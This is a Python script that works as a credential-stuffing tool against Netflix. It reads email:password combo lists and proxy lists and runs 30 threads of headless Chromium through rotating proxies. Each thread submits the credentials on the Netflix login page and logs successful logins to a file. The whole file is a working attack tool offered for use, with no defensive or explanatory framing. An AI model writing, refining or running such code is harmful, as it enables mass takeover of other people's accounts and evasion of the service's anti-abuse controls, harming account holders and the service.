import threading, queue, time, random
from datetime import datetime
from utils import load_accounts, load_proxies, save_result
from playwright.sync_api import sync_playwright

def timestamp():
    return datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")

def check_account(email, password, proxy):
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True, proxy={"server": f"http://{proxy}"})
            context = browser.new_context()
            page = context.new_page()

            page.goto("https://www.netflix.com/login", timeout=20000)
            page.fill("input[name='userLoginId']", email)
            page.fill("input[name='password']", password)
            page.click("button[type='submit']")
            page.wait_for_timeout(5000)

            if "browse" in page.url:
                return True
            return False
    except Exception as e:
        return False

def worker(acc_q, proxies, success_list, fail_list):
    while not acc_q.empty():
        acc = acc_q.get()
        email, password = acc.split(":", 1)
        proxy = random.choice(proxies)
        result = check_account(email, password, proxy)

        log_line = f"{timestamp()} - Proxy {proxy} | Status: {'Success' if result else 'Failed'} | Account: {email}"
        print(log_line)

        if result:
            success_list.append(log_line)
        else:
            fail_list.append(log_line)

        acc_q.task_done()

def start_checker(acc_file, proxy_file):
    accounts = load_accounts(acc_file)
    proxies = load_proxies(proxy_file)

    acc_q = queue.Queue()
    for acc in accounts:
        acc_q.put(acc)

    success_list = []
    fail_list = []
    threads = []

    for _ in range(30):
        t = threading.Thread(target=worker, args=(acc_q, proxies, success_list, fail_list))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    success_file = "success.txt"
    failed_file = "failed.txt"
    save_result(success_file, success_list)
    save_result(failed_file, fail_list)

    return success_file, failed_file
